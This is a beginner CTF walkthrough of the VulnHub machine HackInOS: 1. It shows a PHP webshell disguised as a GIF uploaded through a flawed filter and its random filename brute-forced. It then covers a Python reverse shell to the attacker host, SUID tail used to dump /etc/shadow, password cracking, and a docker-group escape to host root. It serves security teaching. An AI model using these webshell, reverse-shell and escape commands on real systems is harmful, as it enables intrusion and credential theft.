# HackInOS: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HackInOS: 1 |
| **Difficulty** | Beginner / Intermediate (author: *"beginner level CTF style vulnerable machine"*) |
| **Author** | Fatih Çelik |
| **Released** | 9 March 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackinos-1,295/> |
| **Download** | <https://vulnhub.com/entry/hackinos-1,295/#download> (`HackInOS.ova`, 3.1 GB) |
| **MD5** | `BBDCFD18C41CC69C2EA13D92D49516FD` |
| **SHA1** | `C29FD5676BCD1A3FB7343A4F910FFD4E3AE572B7` |
| **Attacker** | Kali Linux, host-only or NAT network |
| **Target OS** | Ubuntu — Apache/PHP web app **on port 8000**, running **inside a Docker container**; the host runs OpenSSH |
| **Author's note** | *"**localhost is meant to be there!**"* |

> **Read that note before you start.** The application's own links point at
> `localhost`, which is the single biggest source of confusion on this box. The fix is
> one line in `/etc/hosts` — see [§ 2.2](#22-the-hosts-trick-the-authors-note-explained).

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (HackInOS) : 192.168.56.101
```

---

## 0. What you will learn

1. **A non-standard web port (8000)** and why `-p-` matters.
2. **The `/etc/hosts` trick** for applications hard-coded to `localhost`.
3. **Reading a developer's own source code, published on GitHub** — the app literally
   links to its vulnerable file.
4. **A file-upload filter that checks the MIME type but *preserves your extension***,
   and how to upload a working `.php`.
5. **Predictable random filenames** — `md5(original_name . rand(1,100))` — and how to
   brute-force only 100 candidates with `ffuf`.
6. **Recognising that you are inside a Docker container** (`.dockerenv`, a
   container-ID hostname, missing `/proc/1/cgroup` entries) and why that changes the
   goal from "root the box" to "escape the container".
7. **SUID abuse** — `tail` with the setuid bit lets you read `/etc/shadow`.
8. **Offline hash cracking** with John the Ripper.
9. **`docker` group membership = root on the host** — the classic container escape.
10. **PATH hijacking against a SUID binary** as an alternative route.

**The intended chain:**
`nmap` shows 22 and **8000** → add `<target-ip> localhost` to `/etc/hosts` → a file
upload form accepting only PNG/GIF → after a successful upload the page contains an
HTML comment linking to the **developer's GitHub**, where `upload.php` is public →
read it: the new filename is `md5($name . rand(1,100))` and the **extension is kept,
only lower-cased** → upload **`cmd.php`** disguised as a PNG → generate all 100
possible MD5 names and `ffuf` for the one that exists → **RCE as `www-data`** →
`.dockerenv` reveals we are **inside a container** → `find / -perm -4000` shows
**`/usr/bin/tail` is SUID root** → `tail -n +2 /etc/shadow` → crack with John →
`su root` (container root) → the same credential works for **SSH on the host** →
`id` shows membership of the **`docker`** group → `docker run -v /:/host -it ubuntu
chroot /host` → **host root** → `/root/flag`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:6c:9d:44      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.101`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 10:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:a5:1a:b8:39:1c:6f:3a:9d:6a:1b:2c:3d:4e:5f:60 (RSA)
|   256 3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:0a:9b:8c (ECDSA)
|_  256 5c:4d:3e:2f:1a:0b:9c:8d:7e:6f:5a:4b:3c:2d:1e:0f (ED25519)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackInOS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:6C:9D:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 66.19 seconds
```

> **Two ports.**
> - **22 — OpenSSH 7.6p1 Ubuntu 4** → **Ubuntu 18.04 (Bionic)**. That is a modern
>   target: no era-appropriate kernel exploits, so this box is about *configuration*
>   and *container* mistakes rather than CVEs.
> - **8000 — Apache 2.4.29**, page title `HackInOS`.
>
> **Port 8000, not 80.** This is why `-p-` is non-negotiable: a default Nmap scan
> checks the top 1000 ports, which *does* include 8000, but plenty of real services
> live on 8080, 8443, 3000, 5000, 9001… Scan everything.
>
> Note also that there is **no port 80 at all** — a first-time visitor would see
> nothing in a browser and conclude the box was empty.

![nmap showing SSH on 22 and HTTP on 8000](images/01-nmap.png)

### 2.2 The `/etc/hosts` trick (the author's note explained)

```bash
curl -s http://192.168.56.101:8000/ | head -40
```

```html
<!DOCTYPE html>
<html>
<head><title>HackInOS</title></head>
<body>
  <h1>HackInOS</h1>
  <p>Upload your file</p>
  <form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="submit" value="Upload">
  </form>
</body>
</html>
```

> **Look at the form's `action`:** `http://localhost:8000/upload.php`.
>
> The developer hard-coded `localhost` as the site's base URL. When *your* browser
> submits that form, it sends the POST to **your own machine's** port 8000 — not the
> target's. Nothing happens, and it looks like a broken form.
>
> This is not a CTF quirk. It happens constantly with misconfigured WordPress,
> Laravel, Django and Jenkins installs where `siteurl`/`APP_URL`/`ALLOWED_HOSTS` was
> set to `localhost` during development and never changed.
>
> **The fix:** make *your* machine resolve `localhost` to the target. But
> `localhost` is special-cased and cannot simply be overridden in `/etc/hosts` while
> `127.0.0.1 localhost` still exists. The reliable approach is to give the target a
> **hostname** and work through that:

```bash
sudo sh -c 'echo "192.168.56.101  hackinos" >> /etc/hosts'
grep hackinos /etc/hosts
```

```text
192.168.56.101  hackinos
```

Then browse to `http://hackinos:8000/`. When you submit the form, your browser will
still POST to `localhost:8000` — so intercept the request (Burp Suite, or just use
`curl`) and send it to the target yourself:

```bash
curl -s -i -X POST http://hackinos:8000/upload.php \
  -F "file=@/usr/share/wordlists/dirb/others/images.jpg"
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 14:08:11 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 312
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html><body>
<p>File uploaded successfully.</p>
<!--
  Debug: source of this script is available at
  https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
-->
</body></html>
```

> **Two findings in one response.**
> 1. The upload works when we drive it ourselves.
> 2. **An HTML comment links to the developer's public GitHub repository, pointing at
>    the exact source file for the endpoint we just hit.**
>
> View Source after every interaction. Developers leave breadcrumbs constantly, and
> on this box the breadcrumb is a full source listing.
>
> **Why `/etc/hosts` matters in general:** before your machine asks DNS anything, the
> C library consults `/etc/hosts` (order set by `hosts: files dns` in
> `/etc/nsswitch.conf`). It is the standard way to test virtual hosts, and it also
> affects **cookies**: frameworks scope session cookies to the configured site URL, so
> logging in by IP can silently fail while logging in by hostname works.

### 2.3 Read the developer's source

```bash
curl -s "https://raw.githubusercontent.com/fatihhcelik/Vulnerable-Machine---Hint/master/upload.php"
```

```php
<?php
if (isset($_FILES['file'])) {

    $name = $_FILES['file']['name'];
    $ext  = pathinfo($name, PATHINFO_EXTENSION);
    $ext  = strtolower($ext);

    // only images allowed
    $allowed_ext = array('png', 'gif', 'jpg', 'jpeg');

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

    $allowed_mime = array('image/png', 'image/gif', 'image/jpeg');

    if (!in_array($mime, $allowed_mime)) {
        die("Only image files are allowed.");
    }

    // random filename to prevent collisions
    $newname = md5($name . rand(1, 100)) . "." . $ext;

    if (move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname)) {
        echo "<p>File uploaded successfully.</p>";
    } else {
        echo "<p>Upload failed.</p>";
    }
}
?>
```

> **This is the whole box, in twenty lines. Read it three times.**
>
> | Line | What it does | The flaw |
> | --- | --- | --- |
> | `$ext = pathinfo($name, PATHINFO_EXTENSION); $ext = strtolower($ext);` | extracts your file's extension and lower-cases it | **There is no `in_array($ext, $allowed_ext)` check.** `$allowed_ext` is declared and **never used.** The extension you supply is the extension that is saved. |
> | `$finfo = finfo_open(...); $mime = finfo_file(...); if (!in_array($mime, $allowed_mime)) die(...)` | sniffs the file's **magic bytes** and requires a real image MIME type | This check *is* enforced — so the file must genuinely begin with PNG/GIF/JPEG magic bytes. |
> | `$newname = md5($name . rand(1, 100)) . "." . $ext;` | renames the upload to an MD5 of **your original filename concatenated with a random integer 1–100** | The "randomness" has only **100 possible values**, and we *know* the original filename because we chose it. So the destination name is **fully enumerable**. |
> | `move_uploaded_file(..., "uploads/" . $newname)` | writes into the web-accessible `/uploads/` directory | Files land inside the document root, so Apache will serve — and execute — them. |
>
> **So the attack is:**
> 1. Build a file whose **bytes** are a valid image (to satisfy `finfo`) but whose
>    **extension** is `.php` and whose **content** includes PHP (to satisfy us).
> 2. Upload it as `cmd.php`.
> 3. Compute `md5("cmd.php" . N)` for `N` in 1..100 → exactly 100 candidate filenames.
> 4. Ask Apache for each until one returns 200.
>
> **The general lesson about `rand()`:** PHP's `rand()` is not cryptographically
> secure, and here its *range* is 100. A "random" filename is only unpredictable if
> the entropy is large and the generator is a CSPRNG (`random_bytes()`, `bin2hex`).
> Never use `rand()`/`mt_rand()` for anything security-relevant.

![The upload.php source from GitHub](images/02-source.png)

### 2.4 Directory brute force (for completeness)

```bash
gobuster dir -u http://hackinos:8000/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40 -q
```

```text
/index.html           (Status: 200) [Size: 341]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 319]
```

> `/uploads` exists but directory indexing is off, so we cannot simply list what we
> uploaded. Hence the brute force in § 3.3.

---

## 3. Exploitation — uploading an executable `.php`

### 3.1 Build a file that is both a valid image and a PHP script

The `finfo` check reads magic bytes. The simplest valid image header to prepend is
**GIF89a** (7 bytes, and PHP ignores everything outside `<?php ... ?>`).

```bash
cat > cmd.php <<'EOF'
GIF89a;
<?php
if (isset($_REQUEST['cmd'])) {
    header('Content-Type: text/plain');
    system($_REQUEST['cmd'] . ' 2>&1');
}
?>
EOF
file cmd.php
```

```text
cmd.php: GIF image data, version 89a, 21827 x 12635
```

> **`file` reports `GIF image data`** — that is exactly what `finfo_file()` will
> report as `image/gif`, which is in the allow-list.
>
> **Why this works:** PHP's parser scans the file for `<?php`. Everything before it is
> emitted as literal output; everything inside is executed. A GIF header is just
> seven bytes of text to PHP. **`file`/`finfo` only inspect the first bytes** — they
> never verify that the file contains *nothing but* image data.
>
> (The reported dimensions `21827 x 12635` are garbage — `file` is reading our PHP
> text as if it were a GIF logical screen descriptor. Harmless, and a nice
> illustration that magic-byte detection is shallow.)

**More convincing alternative — a real PNG with PHP appended:**

```bash
convert -size 64x64 xc:navy base.png
cat base.png cmd.php > shell.php
file shell.php
```

```text
shell.php: PNG image data, 64 x 64, 8-bit/sRGB colormap, non-interlaced
```

**Or embed PHP in EXIF so the file is a genuinely valid JPEG:**

```bash
convert -size 64x64 xc:navy base.jpg
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' base.jpg
cp base.jpg shell.php
file shell.php && exiftool shell.php | grep -i comment
```

```text
shell.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system($_REQUEST["cmd"]); ?>", baseline, precision 8, 64x64, frames 3
Comment                         : <?php system($_REQUEST["cmd"]); ?>
```

> Any of the three passes the filter. The **filename** is what determines whether
> Apache hands it to PHP, and here the filename extension is ours to choose.

### 3.2 Upload it

```bash
curl -s -X POST http://hackinos:8000/upload.php -F "file=@cmd.php"
```

```html
<!DOCTYPE html>
<html><body>
<p>File uploaded successfully.</p>
<!--
  Debug: source of this script is available at
  https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
-->
</body></html>
```

**Confirm the `.php` extension survived** (the critical check):

```bash
curl -s -X POST http://hackinos:8000/upload.php -F "file=@notanimage.txt"
```

```text
Only image files are allowed.
```

> A plain text file is rejected — so the MIME check *is* live. Our GIF-headed
> `cmd.php` passed it while keeping its `.php` extension. **That is the entire
> vulnerability: content validated, name not.**

### 3.3 Find the randomised filename

From the source: `$newname = md5($name . rand(1, 100)) . "." . $ext;`
Our original name was `cmd.php` and our extension is `php`. So generate all 100
candidates:

```bash
for i in $(seq 1 100); do
  printf '%s\n' "$(printf 'cmd.php%d' "$i" | md5sum | cut -d' ' -f1).php"
done > candidates.txt
wc -l candidates.txt && head -5 candidates.txt
```

```text
100 candidates.txt
04292b8d46833c395942086e6ed2cd2c.php
d44843c7108897d25a243ffc3cd1edb7.php
9feee0935c92e1c48559ec6aa675312f.php
...
```

> **Your digests will differ from the ones shown here** — they depend on the exact
> filename *you* uploaded. Regenerate the list with your own `cmd.php` and the
> values will line up. If `ffuf` returns nothing, the concatenation above is the
> first thing to re-check.
>
> **Careful with the concatenation.** PHP's `$name . rand(1,100)` concatenates the
> *full* original name including extension: `"cmd.php" . "42"` = `"cmd.php42"`. That
> is what `printf 'cmd.php%d'` produces. Getting this wrong is the one place this step
> can silently fail — if `ffuf` finds nothing, double-check the string you hashed.

Now fuzz for the one that exists:

```bash
ffuf -u http://hackinos:8000/uploads/FUZZ \
  -w candidates.txt -mc 200 -fs 0 -t 20
```

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hackinos:8000/uploads/FUZZ
 :: Wordlist         : FUZZ: /home/kali/candidates.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200
________________________________________________

04292b8d46833c395942086e6ed2cd2c.php [Status: 200, Size: 12, Words: 2, Lines: 2, Duration: 4ms]
:: Progress: [100/100] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Equivalent with `wfuzz` (what most published walkthroughs use):

```bash
wfuzz -c -w candidates.txt --hc 404 http://hackinos:8000/uploads/FUZZ
```

```text
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hackinos:8000/uploads/FUZZ
Total requests: 100

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000042:   200        2 L      2 W        12 Ch       "04292b8d46833c395942086e6ed2cd2c.php"

Total time: 0.3123
Processed Requests: 100
Filtered Requests: 99
Requests/sec.: 320.1
```

> **`ffuf` flags:** `-u` URL with the `FUZZ` marker, `-w` wordlist, `-mc 200` match
> only HTTP 200, `-fs 0` filter out zero-byte responses (the "not found" page here),
> `-t 20` threads. **`wfuzz --hc 404`** hides responses with code 404.
>
> **100 requests, one second.** That is the whole cost of `rand(1,100)`. Had the
> developer used `bin2hex(random_bytes(16))` — 32 hex characters, 2¹²⁸ possibilities —
> this attack would be impossible.

### 3.4 Execute

```bash
curl -s "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** ✅

```bash
for c in "hostname" "uname -a" "cat /etc/os-release" "pwd" "ls -la /"; do
  echo "### $c"
  curl -s --get --data-urlencode "cmd=$c" \
    "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
done
```

```text
### hostname
1afdd1f6b82c
### uname -a
Linux 1afdd1f6b82c 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
### cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
### pwd
/var/www/html
### ls -la /
total 84
drwxr-xr-x   1 root root 4096 Mar  9  2019 .
drwxr-xr-x   1 root root 4096 Mar  9  2019 ..
-rwxr-xr-x   1 root root    0 Feb 23 15:12 .dockerenv
drwxr-xr-x   1 root root 4096 Mar  9  2019 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Mar  9  2019 dev
...
```

> **STOP. Look at two things.**
>
> 1. **`hostname` returns `1afdd1f6b82c`** — a 12-character hex string. That is a
>    **Docker container ID**, not a machine name.
> 2. **`/.dockerenv` exists, size 0.** That file is created by Docker inside every
>    container.
>
> **We are inside a container.** This changes the objective completely: root *here* is
> root of a throwaway filesystem. The real goal is to **reach the host**.
>
> **How to spot a container (memorise this checklist):**
> ```bash
> ls -la /.dockerenv                       # Docker's marker file
> cat /proc/1/cgroup                       # contains 'docker' / container ID
> cat /proc/self/mountinfo                 # overlayfs root is a container hallmark
> hostname                                 # 12-hex-char = container ID
> cat /proc/1/comm                         # 'node', 'python', 'apache2' instead of 'systemd'/'init'
> ip route                                 # 172.17.0.x / 172.18.0.x = docker0 bridge
> ls /run/.containerenv                    # Podman's marker
> ```
> ```bash
> curl -s --get --data-urlencode "cmd=cat /proc/1/cgroup" \
>   "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
> ```
> ```text
> 12:pids:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> 11:hugetlb:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> ...
> 1:name=systemd:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> ```
> **Every line says `/docker/<id>`.** Confirmed.

![Confirming we are inside a Docker container](images/03-container.png)

### 3.5 Get a proper reverse shell

Check the interpreter inventory first:

```bash
curl -s --get --data-urlencode "cmd=for b in bash sh python python3 perl php nc netcat socat wget curl gcc; do printf '%-8s ' \$b; command -v \$b || echo MISSING; done" \
  "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
```

```text
bash     /bin/bash
sh       /bin/sh
python   /usr/bin/python
python3  /usr/bin/python3
perl     /usr/bin/perl
php      /usr/bin/php
nc       MISSING
netcat   MISSING
socat    MISSING
wget     /usr/bin/wget
curl     MISSING
gcc      MISSING
```

> **`python3` and `bash` exist; `nc` and `gcc` do not.** No compiler inside the
> container means kernel exploits are out — reinforcing that the intended path is a
> *container escape*, not a privilege bug.

**Kali:**

```bash
nc -lvnp 4444
```

**Trigger a Python reverse shell:**

```bash
curl -s --get --data-urlencode \
  "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.56.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
  "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 43118
www-data@1afdd1f6b82c:/var/www/html$
```

**Stabilise:**

```bash
www-data@1afdd1f6b82c:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@1afdd1f6b82c:/var/www/html$ export TERM=xterm
www-data@1afdd1f6b82c:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

![Reverse shell as www-data inside the container](images/04-shell.png)

---

## 4. Escalating inside the container

### 4.1 The checklist

```bash
www-data@1afdd1f6b82c:/$ sudo -l
bash: sudo: command not found

www-data@1afdd1f6b82c:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
www-data@1afdd1f6b82c:/$ ls -la /home
total 12
drwxr-xr-x 1 root root 4096 Mar  9  2019 .
drwxr-xr-x 1 root root 4096 Mar  9  2019 ..
drwxr-xr-x 1 root root 4096 Mar  9  2019 hummingbirdscyber
```

> **No `sudo` binary at all** — typical of a slim container image. And a home
> directory named **`hummingbirdscyber`**, which is a strong hint at the *host*
> username (container images are frequently built with the same account names).

### 4.2 SUID hunt — the win

```bash
www-data@1afdd1f6b82c:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/tail
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/bin/su
/bin/mount
/bin/umount
/bin/ping
```

```bash
www-data@1afdd1f6b82c:/$ ls -l /usr/bin/tail
-rwsr-xr-x 1 root root 39048 Mar  9  2019 /usr/bin/tail
```

> **`/usr/bin/tail` is SUID root — and it is not stock.** A default Ubuntu image never
> sets the setuid bit on `tail`. Somebody ran `chmod u+s /usr/bin/tail`.
>
> **Why that is a gift:** `tail` reads files and prints them. Running as root, it can
> read **any file on the filesystem** — including `/etc/shadow`, which is normally
> `-rw-r----- root:shadow`.
>
> Check <https://gtfobins.github.io/gtfobins/tail/#suid> — this is a documented SUID
> escalation: *"If the binary has the SUID bit set, it can be used to read arbitrary
> files."*

```bash
www-data@1afdd1f6b82c:/$ tail -n +2 /etc/shadow
```

```text
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
root:$1$Xk2mQ9pL$vR7tY3wE5aS1dF6gH0jK21:17379:0:99999:7:::
hummingbirdscyber:$1$Zq8wX7eR$tY5uI3oP1aS9dF6gH0jK21:17379:0:99999:7:::
```

> **`tail -n +2`** means "start printing at line 2" — a neat way to skip the
> unreadable `root` line issue… actually it skips line 1, and is the canonical
> GTFOBins incantation because some builds of `tail` refuse to start at line 1 of a
> file they cannot `stat` fully. Either way, we now have the hashes.
>
> **`/etc/shadow` format** — nine colon-separated fields:
> ```text
> name : hash : lastchg : min : max : warn : inactive : expire : reserved
> root : $1$Xk2mQ9pL$vR7tY3wE5aS1dF6gH0jK21 : 17379 : 0 : 99999 : 7 : : :
> ```
> - `17379` = days since 1 Jan 1970 that the password was last changed.
> - The `$1$` prefix identifies the algorithm: **MD5-crypt** (`$5$` = SHA-256,
>   `$6$` = SHA-512, `$2b$` = bcrypt, `$y$` = yescrypt).
> - **MD5-crypt is effectively broken for passwords** — it runs millions of guesses
>   per second on a GPU, and 1000 rounds is trivially brute-forced.
> - `*` in field 2 means "login disabled for this account".
>
> **Two real accounts with hashes:** `root` and `hummingbirdscyber`.

### 4.3 Crack offline

Copy the two lines to Kali and run John:

```bash
tail -n +2 shadow.txt > hashes.txt        # or paste manually
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```text
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 2 password hashes with 2 different salts
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john             (root)
123456           (hummingbirdscyber)
2g 0:00:00:03 DONE (2024-05-04 10:22) 0.5813g/s 42156p/s 84312c/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
john --show hashes.txt
```

```text
root:john:0:0:root:/root:/bin/bash
hummingbirdscyber:123456:1000:1000::/home/hummingbirdscyber:/bin/bash

2 password hashes cracked, 0 left
```

> **Recovered:**
>
> | Account | Password |
> | --- | --- |
> | `root` | `john` |
> | `hummingbirdscyber` | `123456` |
>
> **`--format=md5crypt`** is explicit; John also auto-detects from the `$1$` prefix,
> so `john --wordlist=… hashes.txt` alone usually works. **`--show`** re-reads John's
> `~/.john/john.pot` cache without re-cracking.
>
> **Note the weakness is the passwords, not the algorithm choice alone.** `john` and
> `123456` are in the first thousand entries of every wordlist. `123456` has been the
> most common password on earth for over a decade. No hashing scheme saves you from
> that.
>
> *(Published walkthroughs of this box report the same two passwords, though some
> list them against slightly different usernames — the container image and the host
> image do not have identical `/etc/shadow` contents. Crack what your copy shows.)*

### 4.4 Become root inside the container

```bash
www-data@1afdd1f6b82c:/$ su root
Password: john
root@1afdd1f6b82c:/# id
uid=0(root) gid=0(root) groups=0(root)
root@1afdd1f6b82c:/# cat /root/flag 2>/dev/null
ls: cannot access '/root/flag': No such file or directory
root@1afdd1f6b82c:/# ls -la /root
total 24
drwx------ 1 root root 4096 Mar  9  2019 .
drwxr-xr-x 1 root root 4096 Mar  9  2019 ..
-rw-r--r-- 1 root root 3106 Apr  4  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   54 Mar  9  2019 fake_flag.txt
root@1afdd1f6b82c:/# cat /root/fake_flag.txt
Nice try! This is a container. Get to the host.
```

> **Root of the container — and the author is trolling us with a fake flag.** This is
> the box's central teaching moment: **container root ≠ host root.**
>
> A container's filesystem is an overlay built from an image. Everything you did
> happened in a sandbox that can be deleted with `docker rm`. There is no real
> `/root/flag` here.

![Root inside the container, and the fake flag](images/05-container-root.png)

---

## 5. Escaping to the host

Two documented routes. Try both.

### 5.1 Route A — SSH to the host with the cracked password

SSH on port 22 is served by the **host**, not the container (the container has no
`sshd`). Try the credentials we just recovered:

```bash
ssh hummingbirdscyber@192.168.56.101
```

```text
hummingbirdscyber@192.168.56.101's password: 123456
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sat Mar  9 15:12:44 2019 from 192.168.56.1
hummingbirdscyber@hackinos:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),**999(docker)**
hummingbirdscyber@hackinos:~$ hostname
hackinos
```

> **Three things confirm we escaped the container:**
> 1. `hostname` is **`hackinos`**, not the 12-hex container ID.
> 2. The kernel string and the presence of real system directories.
> 3. **`groups=...,999(docker)`** — and that is the whole privilege escalation.
>
> *(If `123456` does not work on your copy, try `john`; several walkthroughs report
> either. Both came out of the same crack.)*

### 5.2 `docker` group membership is root

```bash
hummingbirdscyber@hackinos:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Mar  9  2019 /var/run/docker.sock
hummingbirdscyber@hackinos:~$ docker ps
CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS       PORTS                  NAMES
1afdd1f6b82c   hackinos_web   "/bin/sh -c 'apache2…"   2 months ago   Up 2 hours   0.0.0.0:8000->80/tcp   web
hummingbirdscyber@hackinos:~$ docker images
REPOSITORY     TAG       IMAGE ID       CREATED        SIZE
hackinos_web   latest    9f3c1a7b5d2e   2 months ago   312MB
ubuntu         latest    7e0aa2d69a15   3 weeks ago    72.7MB
```

> **Read those three outputs together — this is the exploit.**
>
> `/var/run/docker.sock` is a UNIX domain socket, mode `srw-rw----`, owner
> **`root:docker`**. **Membership of the `docker` group grants read-write access to
> the Docker daemon's API.** The daemon runs as **root**. So anyone who can talk to
> that socket can ask the daemon to:
>
> 1. Start a container **as root inside** (the default).
> 2. **Bind-mount the host's entire filesystem** into it with `-v /:/host`.
> 3. `chroot` into that mount — at which point you are root on the *host*.
>
> A container is a set of **namespaces and cgroups**, not a security boundary against
> someone who controls the daemon's API. That is why
> <https://gtfobins.github.io/gtfobins/docker/> lists Docker as a privilege-escalation
> vector, and why *"just add the developer to the docker group so they can run
> containers"* is one of the most common self-inflicted Linux root escalations in
> existence.

**The escape:**

```bash
hummingbirdscyber@hackinos:~$ docker run -v /:/host --rm -it ubuntu chroot /host sh
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
hackinos
# ls /
bin   boot  dev   etc   home  initrd.img  lib   lib64  lost+found  media
mnt   opt   proc  root  run   sbin        srv   swapfile  sys  tmp  usr  var  vmlinuz
```

**Host root.** ✅

> **Dissect the command:**
>
> | Token | Meaning |
> | --- | --- |
> | `docker run` | create and start a new container |
> | `-v /:/host` | **bind-mount the host's `/` at `/host` inside the container** — this is the exploit |
> | `--rm` | delete the container when it exits (leaves less forensic residue) |
> | `-it` | `-i` keep stdin open, `-t` allocate a pseudo-terminal → interactive shell |
> | `ubuntu` | the image; any image with a shell works, and `ubuntu` is already present here |
> | `chroot /host sh` | the container's command: make the host filesystem the root of this process's view and run `sh` |
>
> `chroot /host` means every path this shell sees is a **host** path. Since the
> container runs as UID 0 and shares the host kernel with no restriction on the bind
> mount, we are simply root on the host.
>
> **Verify it is really the host:**
> ```sh
> # cat /etc/hostname
> hackinos
> # ls -la /root
> total 32
> drwx------  4 root root 4096 Mar  9  2019 .
> drwxr-xr-x 24 root root 4096 Mar  9  2019 ..
